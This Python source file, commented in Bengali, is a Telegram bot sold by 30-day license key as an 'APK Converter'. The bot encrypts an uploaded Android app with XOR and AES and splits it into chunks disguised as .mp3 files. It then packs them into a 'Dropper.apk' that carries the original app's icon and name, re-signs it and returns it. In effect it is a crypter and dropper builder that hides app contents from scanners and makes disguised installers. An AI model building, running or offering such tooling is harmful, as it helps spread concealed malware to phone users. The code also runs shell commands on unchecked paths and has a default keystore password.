import os
import json
import base64
import hashlib
import sqlite3
import datetime
import tempfile
import shutil
import subprocess
import threading
import random
import string
import time
import logging
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# ----- লগিং সেটআপ -----
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ----- Flask app for Render -----
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

@app.route('/health')
def health():
    return "OK"

# ----- কনফিগারেশন -----
BOT_TOKEN = os.environ.get('BOT_TOKEN')
if not BOT_TOKEN:
    logger.error("❌ BOT_TOKEN environment variable not set!")
    # Flask still runs, but bot won't start
else:
    logger.info("✅ BOT_TOKEN loaded successfully.")

# ----- ক্রিপ্টো কনফিগারেশন (আপনার দেওয়া) -----
OBFUSCATED_AES_KEY_B64 = "Xe53JgjByDVFfeZl9W+TyCcATz4ux1PHf9Mih7Vsre0="
OBFUSCATED_XOR_KEY_B64 = "W5MCyVrJGGKwWtgXFNS6PvlaH1Xivh/MHO8T+PIhKMd7Eb8+R4NmX23lQBNVefrFbSmG+jNjxZCHBxVos/irfbjkBdfFmp1YIXlQXTXO/HUTCLDghib+WSmsdR4BPVDVQaXHBkclBjuhChvOCSnYolaowwAEkpLlMmfPM0+gkV9NHys8e85JEjmBg5izx48HVVifiL4YhsuxWlKJLfLHodezX2v93DIztfL+UAzGHxtOHfwRagmedxyX+jD18GfpFmLO6GjlUTiymXzGu0uRFuwAd4+o70Yf0Istzoj8h7Az1J33aTQFF5XKAu32zetVnMG1bFQSaQcfm9U1vWcFC0F6ArJNxES6Tar8Bg=="

def xor_data(data: bytes, key: bytes) -> bytes:
    return bytes(d ^ key[i % len(key)] for i, d in enumerate(data))

def decode_obfuscated(b64_str: str) -> bytes:
    raw = base64.b64decode(b64_str)
    mask = hashlib.sha256("dynamic_key_rotate_monthly".encode()).digest()
    return xor_data(raw, mask)

ACTUAL_AES_KEY = decode_obfuscated(OBFUSCATED_AES_KEY_B64)
ACTUAL_XOR_KEY = decode_obfuscated(OBFUSCATED_XOR_KEY_B64)
IV_HEX = "aabbccddeeffaabbccddeeffaabbccdd"
NUM_PARTS = 15
PREFIX = "part_"
TARGET_PACKAGE = "com.meteah.apl"

# ----- ডাটাবেস সেটআপ -----
DB_PATH = 'db/keys.db'
os.makedirs('db', exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS keys
                 (user_id INTEGER PRIMARY KEY, key TEXT, expiry_date TEXT)''')
    conn.commit()
    conn.close()
    logger.info("Database initialized.")

def generate_key(user_id):
    raw = os.urandom(16)
    key = hashlib.sha256(raw).hexdigest()[:16]
    expiry = (datetime.datetime.now() + datetime.timedelta(days=30)).isoformat()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('INSERT OR REPLACE INTO keys (user_id, key, expiry_date) VALUES (?, ?, ?)',
              (user_id, key, expiry))
    conn.commit()
    conn.close()
    return key

def validate_key(user_id, key):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT expiry_date FROM keys WHERE user_id=? AND key=?', (user_id, key))
    row = c.fetchone()
    conn.close()
    if not row:
        return False
    expiry = datetime.datetime.fromisoformat(row[0])
    return expiry > datetime.datetime.now()

def get_user_key(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT key, expiry_date FROM keys WHERE user_id=?', (user_id,))
    row = c.fetchone()
    conn.close()
    return row if row else None

# ----- এনক্রিপশন ফাংশন (আপনার দেওয়া) -----
def generate_build_id(length=16):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_entropy_seed(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def process_encryption(apk_data: bytes, assets_dir: str):
    # XOR
    xor_step = xor_data(apk_data, ACTUAL_XOR_KEY)
    # AES
    iv_bytes = bytes.fromhex(IV_HEX)
    cipher = AES.new(ACTUAL_AES_KEY, AES.MODE_CBC, iv_bytes)
    encrypted_full = cipher.encrypt(pad(xor_step, AES.block_size))
    # Split
    chunk_size = len(encrypted_full) // NUM_PARTS + 1
    chunks = []
    for i in range(NUM_PARTS):
        start = i * chunk_size
        end = min(start + chunk_size, len(encrypted_full))
        chunks.append(encrypted_full[start:end])
    # Metadata
    meta = {
        "build_id": generate_build_id(),
        "timestamp": int(time.time()),
        "total_parts": NUM_PARTS,
        "chunk_size": chunk_size,
        "enc_size": len(encrypted_full),
        "original_size": len(apk_data),
        "original_md5": hashlib.md5(apk_data).hexdigest(),
        "aes_key": OBFUSCATED_AES_KEY_B64,
        "aes_iv": IV_HEX,
        "xor_key": OBFUSCATED_XOR_KEY_B64,
        "entropy_seed": generate_entropy_seed(),
        "v3_flag": True
    }
    os.makedirs(assets_dir, exist_ok=True)
    with open(os.path.join(assets_dir, 'manifest.json'), 'w') as f:
        json.dump(meta, f, indent=4)
    for i, chunk in enumerate(chunks):
        with open(os.path.join(assets_dir, f"{PREFIX}{i}.mp3"), 'wb') as f:
            f.write(bytes(chunk))
    logger.info(f"Encryption completed. {len(chunks)} chunks created in {assets_dir}")
    return meta

# ----- APK প্রসেসিং (ব্যাকগ্রাউন্ডে) -----
async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, apk_data: bytes):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    work_dir = tempfile.mkdtemp()
    try:
        input_apk = os.path.join(work_dir, 'input.apk')
        with open(input_apk, 'wb') as f:
            f.write(apk_data)

        await context.bot.send_message(chat_id, "📦 Decoding APK...")

        # ডিকোড
        decoded_dir = os.path.join(work_dir, 'decoded')
        cmd = f"apktool d -f -o {decoded_dir} {input_apk}"
        logger.info(f"Running: {cmd}")
        subprocess.run(cmd, shell=True, check=True, capture_output=True)

        # প্যাকেজ নাম পরিবর্তন
        manifest_path = os.path.join(decoded_dir, 'AndroidManifest.xml')
        with open(manifest_path, 'r') as f:
            manifest = f.read()
        manifest = manifest.replace('package="', f'package="{TARGET_PACKAGE}"')
        with open(manifest_path, 'w') as f:
            f.write(manifest)

        await context.bot.send_message(chat_id, "🔐 Encrypting...")

        # এনক্রিপ্ট
        assets_dir = os.path.join(decoded_dir, 'assets')
        process_encryption(apk_data, assets_dir)

        # Dropper.apk ডিকোড
        dropper_apk = os.path.join(os.getcwd(), 'Dropper.apk')
        if not os.path.exists(dropper_apk):
            await context.bot.send_message(chat_id, "⚠️ Dropper.apk not found, creating dummy")
            with open(dropper_apk, 'wb') as f:
                f.write(b'')
        dropper_decoded = os.path.join(work_dir, 'dropper_decoded')
        cmd = f"apktool d -f -o {dropper_decoded} {dropper_apk}"
        logger.info(f"Running: {cmd}")
        subprocess.run(cmd, shell=True, check=True, capture_output=True)

        # আইকন ও নাম কপি
        res_src = os.path.join(decoded_dir, 'res')
        res_dst = os.path.join(dropper_decoded, 'res')
        if os.path.exists(res_src):
            shutil.copytree(res_src, res_dst, dirs_exist_ok=True)

        # app_name আপডেট
        strings_src = os.path.join(decoded_dir, 'res/values/strings.xml')
        if os.path.exists(strings_src):
            import xml.etree.ElementTree as ET
            tree = ET.parse(strings_src)
            root = tree.getroot()
            app_name = None
            for string in root.findall('string'):
                if string.get('name') == 'app_name':
                    app_name = string.text
                    break
            if app_name:
                strings_dst = os.path.join(dropper_decoded, 'res/values/strings.xml')
                if os.path.exists(strings_dst):
                    dtree = ET.parse(strings_dst)
                    droot = dtree.getroot()
                    for string in droot.findall('string'):
                        if string.get('name') == 'app_name':
                            string.text = app_name
                            break
                    dtree.write(strings_dst)

        # ম্যানিফেস্ট আপডেট
        dropper_manifest = os.path.join(dropper_decoded, 'AndroidManifest.xml')
        with open(dropper_manifest, 'r') as f:
            dmanifest = f.read()
        with open(dropper_manifest, 'w') as f:
            f.write(dmanifest)

        await context.bot.send_message(chat_id, "✍️ Rebuilding APK...")

        # রিকম্পাইল
        output_apk = os.path.join(work_dir, 'output.apk')
        cmd = f"apktool b -o {output_apk} {dropper_decoded}"
        logger.info(f"Running: {cmd}")
        subprocess.run(cmd, shell=True, check=True, capture_output=True)

        # সাইন
        keystore = os.path.join(os.getcwd(), 'signer/keystore.jks')
        passwd = os.environ.get('KEYSTORE_PASS', '123456')
        cmd = f"jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore {keystore} -storepass {passwd} -keypass {passwd} {output_apk} mykey"
        logger.info(f"Running: {cmd}")
        subprocess.run(cmd, shell=True, check=True, capture_output=True)

        # ইউজারকে পাঠান
        with open(output_apk, 'rb') as f:
            await context.bot.send_document(chat_id, f, filename=f"app_{user_id}.apk")

        shutil.rmtree(work_dir)
        logger.info(f"APK processing complete for user {user_id}")

    except Exception as e:
        logger.error(f"Error processing APK: {e}")
        await context.bot.send_message(chat_id, f"❌ Error: {str(e)}")
        shutil.rmtree(work_dir, ignore_errors=True)

# ----- বট কমান্ড -----
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🔑 Get License Key", callback_data='get_key')],
        [InlineKeyboardButton("📤 Upload APK", callback_data='upload')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🤖 Welcome to APK Converter Bot!\n\n"
        "You need a 30-day license key to use this bot.\n"
        "Click 'Get License Key' to receive your key.",
        reply_markup=reply_markup
    )
    logger.info(f"Start command from user {update.effective_user.id}")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if query.data == 'get_key':
        key = generate_key(user_id)
        await query.edit_message_text(
            f"✅ Your 30-day license key:\n\n`{key}`\n\n"
            f"Send /activate {key} to activate your account."
        )
        logger.info(f"Key generated for user {user_id}")
    elif query.data == 'upload':
        key_data = get_user_key(user_id)
        if not key_data:
            await query.edit_message_text("❌ No license key found. Please get a key first.")
            return
        if not validate_key(user_id, key_data[0]):
            await query.edit_message_text("❌ Your license has expired. Please get a new key.")
            return
        await query.edit_message_text("📤 Please send me your APK file.")

async def activate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /activate <key>")
        return
    key = args[0]
    if validate_key(user_id, key):
        await update.message.reply_text("✅ Key activated! You can now upload APKs.")
    else:
        await update.message.reply_text("❌ Invalid key or expired.")

async def upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    key_data = get_user_key(user_id)
    if not key_data or not validate_key(user_id, key_data[0]):
        await update.message.reply_text("❌ No valid license. Use /start to get one.")
        return

    if not update.message.document or not update.message.document.file_name.endswith('.apk'):
        await update.message.reply_text("Please send an APK file.")
        return

    await update.message.reply_text("📦 APK received! Processing... This may take a few minutes.")
    file = await update.message.document.get_file()
    apk_data = await file.download_as_bytearray()

    # ব্যাকগ্রাউন্ডে টাস্ক তৈরি
    context.application.create_task(process_apk_file(update, context, apk_data))

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
🤖 *APK Converter Bot Help*

Commands:
/start - Show main menu
/activate <key> - Activate your license key
/upload - Upload APK (or use menu)
/help - Show this help

*How it works:*
1. Get a 30-day license key from the menu
2. Activate it with /activate <key>
3. Upload your APK
4. Bot will:
   - Change package name to com.meteah.apl
   - Encrypt using AES+XOR
   - Generate MP3 chunks + manifest.json
   - Build a new APK with your icon & name
   - Sign and zipalign
   - Send you the final APK

*Limitations:*
- Only works with APK files
- Processing may take 2-5 minutes
- File size limit: 100 MB
"""
    await update.message.reply_text(help_text, parse_mode='Markdown')

# ----- বট রান করার ফাংশন -----
def run_bot():
    try:
        init_db()
        if not BOT_TOKEN:
            logger.error("BOT_TOKEN is missing. Bot will not start.")
            return
        application = Application.builder().token(BOT_TOKEN).build()
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("activate", activate))
        application.add_handler(CallbackQueryHandler(button_handler))
        application.add_handler(MessageHandler(filters.Document.ALL, upload_handler))
        logger.info("Bot started polling...")
        application.run_polling()
    except Exception as e:
        logger.error(f"Bot crashed: {e}")

# ----- মেইন -----
if __name__ == "__main__":
    # বট থ্রেড চালু
    bot_thread = threading.Thread(target=run_bot)
    bot_thread.start()
    # Flask চালু
    port = int(os.environ.get("PORT", 5000))
    logger.info(f"Flask server starting on port {port}")
    app.run(host="0.0.0.0", port=port)
